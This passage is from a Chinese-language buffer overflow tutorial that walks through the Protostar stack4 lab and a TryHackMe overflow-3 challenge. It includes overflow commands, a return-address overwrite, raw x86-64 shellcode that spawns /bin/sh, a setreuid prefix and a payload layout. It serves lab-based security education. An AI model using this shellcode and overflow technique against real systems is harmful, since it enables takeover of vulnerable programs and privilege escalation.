### 优化后的文本

#### 6. 利用漏洞教育——原恒星的源代码
```c
#include <stdio.h>
#include <string.h>

void win() {
    printf("代码流成功改变\n");
}

int main(int argc, char **argv) {
    char buffer[64];
    gets(buffer);
}
```

我们想要重定向程序的执行流程并调用 `win` 函数。在理想状态下，这个函数不应该被调用。由于源代码中没有函数指针变量且没有可修改的变量，我们可以利用栈溢出覆盖返回地址（return pointer）来实现这一点。通过溢出缓冲区，使返回地址读取错误的值，从而执行 `win` 函数。

#### 7. 通过溢出缓冲区引发分段故障
```bash
user@protostar:/opt/protostar/bin$ python -c 'print("A"*64)' | ./stack4
user@protostar:/opt/protostar/bin$ python -c 'print("A"*70)' | ./stack4
user@protostar:/opt/protostar/bin$ python -c 'print("A"*75)' | ./stack4
user@protostar:/opt/protostar/bin$ python -c 'print("A"*76)' | ./stack4
Segmentation fault
```

可以看到，在输入 76 个字节后引发了分段故障，这意味着我们已经覆写了指令指针。接下来，我们需要 76 个 'A' 和小端方式表示的 `win` 函数的地址。

```bash
user@protostar:/opt/protostar/bin$ objdump -x stack4 | grep win
080483f4 g     F .text 00000014              win
```

我们得到了 `win` 函数的地址 `0x080483f4`。现在使用 Python 输出 76 个 'A' 后跟小端格式的 `win` 地址。

```bash
user@protostar:/opt/protostar/bin$ python -c 'print("A"*76 + "\xf4\x83\x04\x08")' | ./stack4
代码流成功改变
Segmentation fault
```

成功改变了代码执行流程，并调用了 `win` 函数。出现分段故障的原因是程序在执行 `win` 函数后尝试返回下一个栈中的值，但该值是一个无效的代码段。

#### 8. 缓冲区溢出的进一步探索
现在是时候编写我们的第一个缓冲区溢出 shellcode，展示缓冲区溢出的强大之处。在之前的例子中，我们看到当程序接受用户控制的输入时，可能不会检查长度，恶意用户可以覆盖值并改变程序行为。我们可以控制函数的返回地址，从而改变程序的执行流程。通过这些技术，我们可以做哪些有用的事情？答案是 "ShellCode"。

#### 9. ShellCode 过程
ShellCode 是一段远程注入的具体代码，用于攻击各种软件漏洞。它通常会生成一个 shell，允许攻击者控制受影响的系统。以下是一个常见的过程：

1. 找到缓冲区的起始地址和返回地址的起始地址。
2. 分析两者之间的差距，确定需要多少数据才能溢出。
3. 在缓冲区中输入 shellcode，然后在 shellcode 和返回地址之间填充随机数据，并在返回地址中输入缓冲区的地址。

在这个例子中，我们将从 THM room 的缓冲区溢出开始测试。注意 `overflow-3` 文件夹。

#### 10. 挑战：打开一个 shell 并读取 `secret.txt` 文件的内容
在文件夹中，可以看到以下 C 源码：

```c
// buffer-overflow.c
#include <stdio.h>
#include <string.h>

void copy_arg(char *string) {
    char buffer[140];
    strcpy(buffer, string);
    printf("%s\n", buffer);
    return;
}

int main(int argc, char **argv) {
    printf("这是一个回显你输入的程序\n");
    copy_arg(argv[1]);
}
```

`argv[1]` 是一个长度为 140 字节的缓冲区命令行参数。由于 `strcpy` 不检查数据长度，我们可以利用这一点进行溢出。

经过几次尝试后，发现了一个有效的 shellcode（40 字节）：

```python
shellcode = b'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'
```

文件 `/etc/passwd` 包含以下以冒号分隔的信息：
- 用户名
- 加密密码
- 用户 ID (UID)
- 用户组 ID (GID)

我们可以使用 pwntools 生成 shellcode 前缀，执行 `setreuid()` 来设置调用进程的真实和有效用户 ID。

```bash
(1002:user)
pwn shellcraft -f d amd64.linux.setreuid 1002
```

我们的 payload 长度如下：
- NOP sled: 90 字节
- Setreuid: 14 字节
- Shellcode: 40 字节
- 随机字符: 8 字节
- 内存地址: 6 字节

总长度：90 + 14 + 40 + 8 + 6 = 158 字节

使用 Python 编写 exploit 程序非常简单。我的攻击程序如下：

```bash
./buffer-overflow $(python exploit.py; cat)
```

#### 11. 注意事项
这只是一个简单的开始！将来我们会讨论更高级的攻击技术。